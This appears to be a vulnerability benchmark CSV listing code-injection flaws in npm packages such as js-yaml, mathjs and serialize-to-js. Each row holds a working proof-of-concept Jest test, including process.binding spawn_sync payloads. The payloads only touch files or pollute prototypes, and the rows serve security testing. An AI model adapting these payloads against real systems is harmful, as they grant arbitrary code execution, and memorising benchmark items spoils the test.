Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
code-injection,,js-yaml,3.13.0,3.13.1,code-injection/js-yaml_3.13.0,"test(""Arbitrary code execution in js-yaml"", () => {
  expect.assertions(2);
  const payload =
    ""{ toString: !<tag:yaml.org,2002:js/function> 'function (){return (this.constructor.prototype.polluted=`yes`)}' } : 1"";
  const jsyaml = require(""js-yaml"");
  expect({}.polluted).toBe(undefined);
  try {
    jsyaml.load(payload);
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/nodeca/js-yaml/pull/480/commits/e18afbf1edcafb7add2c4c7b22abc8d6ebc2fa61,lib/js-yaml/type/js/function.js:70:12,https://security.snyk.io/vuln/SNYK-JS-JSYAML-174129; https://github.com/advisories/GHSA-xxvw-45rp-3mj2
code-injection,,mathjs,3.9.0,3.11.5,code-injection/mathjs_3.9.0,"test(""Arbitrary code execution in mathjs"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const math = require(""mathjs"");
  const path = ""./mathjs"";
  data = {};
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    math.eval(
      '[].map.constructor(""spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`mathjs`]));"")()'
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/josdejong/mathjs/compare/v3.10.3...v3.11.5,,https://security.snyk.io/vuln/npm:mathjs:20170402; https://github.com/advisories/GHSA-pv8x-p9hq-j328
code-injection,,@zhaoyao91/eval-in-vm,0.0.0,n/a,code-injection/zhaoyao91-eval-in-vm_0.0.0,"test(""Arbitrary code execution in @zhaoyao91/eval-in-vm"", () => {
  expect.assertions(2);
  const eval1 = require(""@zhaoyao91/eval-in-vm"");
  expect({}.polluted).toBe(undefined);
  try {
    (""use strict"");
    const result = eval1(""1 + (this.constructor.prototype.polluted = `yes`);"");
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",n/a,eval-in-vm/index.js:11:6,https://github.com/advisories/GHSA-jp99-5h8w-gmxc; 
code-injection,CVE-2020-7640,pixl-class,1.0.0,1.0.3,code-injection/pixl-class_1.0.0,"test(""Arbitrary code execution in pixl-class"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const a = require(""pixl-class"");
  const path = ""./pixl-class"";
  try {
    if (fs.existsSync(path)) fs.unlinkSync(path);
    console.log(""File removed:"", path);
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  var members = {
    __parent:
      'function(){}; require(""fs"").writeFileSync(""./pixl-class"",""""); //}',
  };
  try {
    a.create(members);
  } catch (e) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/jhuckaby/pixl-class/commit/47677a3638e3583e42f3a05cc7f0b30293d2acc8,class.js:26:4,https://security.snyk.io/vuln/SNYK-JS-PIXLCLASS-564968; https://github.com/advisories/GHSA-vm5j-vqr6-v7v8
code-injection,CVE-2020-15362,wifiscanner,1.0.1,n/a,code-injection/wifiscanner_1.0.1,"test(""Arbitrary code execution in wifiscanner"", () => {
  expect.assertions(1);
  const fs = require(""fs"");
  let wifiscanner = require(""wifiscanner"");
  const sleep = require(""sleep"");
  const path = ""./wifiscanner.txt"";
  let options = {
    args: ""./wifiscanner.txt"",
    binaryPath: ""touch"",
  };
  try {
    let scanner = wifiscanner(options);
    scanner.scan(function (error, networks) {});
  } catch (error) {
    console.log(error);
  }
  sleep.sleep(2);
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",n/a,scanners/wifiscanner.js:12:22,https://security.snyk.io/vuln/SNYK-JS-WIFISCANNER-574786; https://github.com/advisories/GHSA-m6rw-m2v9-7hx4
code-injection,CVE-2017-5954,serialize-to-js,^0.5.0,1.0.0,code-injection/serialize-to-js_0.5.0,"test(""Arbitrary code execution in serialize-to-js"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const serialize = require(""serialize-to-js"");
  const path = ""./serialize-to-js"";
  let payload =
    ""{e: (function(){ spawn_sync = process.binding(`spawn_sync`); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(` `);typeof a.shell===`string`?c=a.shell:c=`/bin/sh`,b=[`-c`,g];}typeof a.argv0===`string`?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+`=`+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:`pipe`,readable:!0,writable:!1},{type:`pipe`,readable:!1,writable:!0},{type:`pipe`,readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}console.log(a);var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!==`buffer`)for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + `spawnSync `+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};console.log(spawnSync(`touch`,[`serialize-to-js`]));})() }"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    serialize.deserialize(payload);
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/commenthol/serialize-to-js/commit/1cd433960e5b9db4c0b537afb28366198a319429,,https://security.snyk.io/vuln/npm:serialize-to-js:20170208; https://github.com/advisories/GHSA-mm62-wxc8-cf7m
code-injection,,mol-proto,^0.1.3,1.0.6,code-injection/mol-proto_0.1.3,"test(""Arbitrary code execution in mol-proto"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const mp = require(""mol-proto"");
  const path = ""./mol-proto"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    mp.makeFunction(
      ""a"",
      ""b"",
      ""};require('fs').writeFileSync('./mol-proto', '');{""
    );
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/milojs/proto/pull/2/commits/10adbec293e7dfdb2e9e565bfd77187cf0373cbe,lib/proto_function.js:70:5,https://security.snyk.io/vuln/npm:mol-proto:20160407; 
code-injection,,m-log,0.0.1,n/a,code-injection/m-log_0.0.1,"test(""Arbitrary code execution in m-log"", () => {
  expect.assertions(2);
  const fs = require(""fs"");
  const log = require(""m-log"");
  const path = ""./m-log"";
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  try {
    log.setColorTheme({
      silly: 'yellow""}); require(`fs`).writeFileSync(`m-log`,``); 23//',
    });
  } catch (error) {}
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {});
});
",https://github.com/m-prj/m-log/pull/1/commits/ee1a08f25555201001dee497addeae9d1705226a,libs/log.js:24:11,https://security.snyk.io/vuln/npm:m-log:20160408; 
code-injection,CVE-2021-23594,realms-shim,1.1.0,n/a,code-injection/realms-shim_1.1.0,"test(""Arbitrary code execution in realms-shim"", () => {
  expect.assertions(2);
  let Realm = require(""realms-shim"");
  const r = Realm.makeRootRealm();
  expect({}.polluted).toBe(undefined);
  try {
    r.evaluate(`let HostException;
          try{
               (0, eval)('--'+'>');
          }catch(e){
               HostException = e;
          }
          const HostObject = HostException.__proto__.__proto__.__proto__;
          HostObject.polluted = 'yes';
          `);
  } catch (error) {}
  expect({}.polluted).toBe(""yes"");
});
",n/a,src/evaluators.js:60:26,https://security.snyk.io/vuln/SNYK-JS-REALMSSHIM-2309907; https://github.com/advisories/GHSA-7cg8-pq9v-x98q
code-injection,,marsdb,0.6.11,n/a,code-injection/marsdb_0.6.11,"test(""Arbitrary code execution in marsdb"", () => {
  expect.assertions(2);
  let Collection = require(""marsdb"").Collection;
  expect({}.polluted).toBe(undefined);
  const posts = new Collection(""posts"", { inMemory: true });
  // try {
  //     let val = posts.insert({ text: 'MarsDB is awesome' });
  //     return val.then(docId => {
  //         let out = posts.find({ $where: '(Object.prototype.polluted=`yes`)' });
  //         out.then(docs => {
  //             expect({}.polluted).toBe('yes');
  //         });
  //     });
  // } catch (e) {
  // }

  return posts.insert({ text: ""MarsDB is awesome"" }).then((docId) => {
    return posts
      .find({ $where: ""(Object.prototype.polluted=`yes`)"" })
      .then((docs) => {
        expect({}.polluted).toBe(""yes"");
      });
  });
});
",n/a,dist/DocumentMatcher.js:419:23,https://security.snyk.io/vuln/SNYK-JS-MARSDB-480405; https://github.com/advisories/GHSA-5mrr-rgp6-x4gr
